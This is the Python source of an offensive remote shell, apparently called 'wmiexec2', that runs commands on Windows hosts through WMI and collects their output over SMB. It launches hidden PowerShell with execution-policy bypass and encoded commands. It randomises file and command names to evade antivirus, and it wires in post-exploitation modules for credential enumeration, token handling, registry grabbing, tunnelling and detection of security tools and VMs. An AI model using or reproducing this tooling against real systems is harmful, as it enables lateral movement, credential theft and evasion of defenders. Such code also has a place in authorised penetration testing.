from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import time
import logging
import ntpath
from base64 import b64encode
from six import PY2

from modules.av.evasion import generate_unique_signature, generate_temp_permutation
from modules.av.opsec import check_av, security_tools, vm, log_grab
from modules.av.msft_defender import defender_checks
from modules.system_info.sysinfo import basic_system_info, get_mounts
from modules.help.help import print_module_help
from modules.survey.survey import survey
from modules.local_commands.local_commands import local_get, local_put, local_cd, local_pwd
from modules.post_ex.post_exploitation import enum_credentials, tokens, regrip, check_unattend
from modules.tunnels.tunnel_mgr import add_tun, show_tun, del_tun


OUTPUT_FILENAME = generate_unique_signature()
CODEC = sys.stdout.encoding


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + generate_temp_permutation("dir") + '\\' + OUTPUT_FILENAME
        print(f"[*] Output Filename: {self.__output}")
        self.__outputBuffer = str('')
        self.__shell = generate_temp_permutation("cmd") + ' /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = generate_temp_permutation("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[*] **Launching wmiexec2**\n[*] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        if self.__silentCommand is True:
            self.__shell = ''

    # ── properties ──────────────────────────────────────────────────

    @property
    def cwd(self): return self.__pwd
    @cwd.setter
    def cwd(self, v): self.__pwd = v

    @property
    def share(self): return self.__share

    @property
    def smb(self): return self.__transferClient

    @property
    def shell_type(self): return self.__shell_type

    @property
    def out(self) -> str:
        return self.__outputBuffer

    def out_clear(self) -> None:
        self.__outputBuffer = ''

    def out_set(self, s: str) -> None:
        self.__outputBuffer = s

    # ── output helpers ──────────────────────────────────────────────

    def format_print_buff(self):
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''

    def print_buf(self, buf: str):
        if len(buf.strip('\r\n')) > 0:
            print(buf)
            self.__outputBuffer = ''    

    # ── remote execution helpers ────────────────────────────────────

    def get_process_list(self) -> tuple:
        try:
            self.execute_remote('tasklist /svc')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                return self.__outputBuffer, ''
        except Exception as e:
            return '', e
        return '', ''

    def get_directory_listing(self, path: str) -> tuple:
        try:
            self.execute_remote(f'dir {path}')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                return self.__outputBuffer, ''
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)
            return '', e
        return '', ''

    def get_directory_listing_findstr(self, path: str, findstr_args: str) -> tuple:
        try:
            self.execute_remote(f'dir {path} | findstr /i {findstr_args}')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                return self.__outputBuffer, ''
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)
            return '', e
        return '', ''

    # ── built-in shell commands ─────────────────────────────────────

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        return print_module_help()

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_ls(self, s):
        if len(s) == 0:
            try:
                self.execute_remote('dir /A /N /O:D .')
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
        else:
            path = s.split(" ")[0]
            try:
                self.execute_remote('dir /A /N /O:D "%s"' % path)
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_cat(self, s):
        try:
            self.execute_remote('type ' + s)
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_cd(self, s):
        raw = (s or '').strip()
        if len(raw) >= 2 and raw[0] == raw[-1] == '"':
            raw = raw[1:-1]

        if raw in ('', '.'):
            target = self.__pwd
        elif raw in ('\\', '/'):
            drive, _ = ntpath.splitdrive(self.__pwd)
            target = drive + '\\'
        else:
            drv, _ = ntpath.splitdrive(raw)
            if drv:
                target = ntpath.normpath(raw)
            elif raw.startswith('\\'):
                cur_drive, _ = ntpath.splitdrive(self.__pwd)
                target = ntpath.normpath(cur_drive + raw)
            else:
                target = ntpath.normpath(ntpath.join(self.__pwd, raw))

        self.execute_remote('cd /d "{}"'.format(target))

        if len(self.__outputBuffer.strip('\r\n')) > 0:
            self.format_print_buff()
            return

        self.__pwd = target
        self.execute_remote('cd ')
        self.__pwd = self.__outputBuffer.strip('\r\n')
        self.prompt = (self.__pwd + '> ')
        if self.__shell_type == 'powershell':
            self.prompt = '\U0001F47B' + ' ' + 'PS ' + self.prompt + ' '
        self.__outputBuffer = ''

    def default(self, line):
        if len(line) == 2 and line[1] == ':':
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    # ── module commands (thin wrappers) ─────────────────────────────

    def do_survey(self, s):
        survey(self, s)

    def do_loggrab(self, s):
        return log_grab(self, s)

    def do_mounts(self, s):
        return get_mounts(self, s)

    def do_sysinfo(self, s):
        return basic_system_info(self, s)

    def do_lcd(self, s):
        return local_cd(self, s)
    
    def do_lpwd(self, s):
        return local_pwd(self, s)

    def do_lget(self, src_path):
        return local_get(self, src_path)

    def do_lput(self, s):
        return local_put(self, s)

    def do_addtun(self, s):
        return add_tun(self, s)

    def do_showtun(self, s):
        return show_tun(self, s)

    def do_deltun(self, s):
        return del_tun(self, s)

    def do_av(self, s):
        return check_av(self, s)

    def do_defender(self, s):
        return defender_checks(self, s)

    def do_tokens(self, s):
        return tokens(self, s)

    def do_creds(self, s):
        return enum_credentials(self, s)

    def do_securitytools(self, s):
        return security_tools(self, s)

    def do_vmcheck(self, s):
        return vm(self, s)

    def do_unattend(self, s):
        return check_unattend(self, s)

    def do_regrip(self, s):
        return regrip(self, s)

    # ── core I/O ────────────────────────────────────────────────────

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        start = time.time()
        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                es = str(e)
                if 'STATUS_SHARING_VIOLATION' in es:
                    time.sleep(1)
                    continue
                elif 'Broken' in es:
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
                elif ('STATUS_OBJECT_NAME_NOT_FOUND' in es or
                    'STATUS_OBJECT_PATH_NOT_FOUND' in es or
                    'The system cannot find the file specified' in es):
                    # WMI Create is async; the output file may not exist yet.
                    # Retry for up to 15 seconds before giving up.
                    if time.time() - start > 15:
                        logging.debug('Output file not found; command likely failed before redirection.')
                        self.__outputBuffer = ''
                        break
                    time.sleep(1)
                    continue
                if time.time() - start > 300:
                    logging.warning('Timeout waiting for remote output.')
                    break
                time.sleep(0.5)

        try:
            self.__transferClient.deleteFile(self.__share, self.__output)
        except Exception:
            pass

    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.__shell + data

        if self.__noOutput is False:
            command += ' 1> ' + '\\\\localhost\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print(self.__outputBuffer)
        self.__outputBuffer = ''
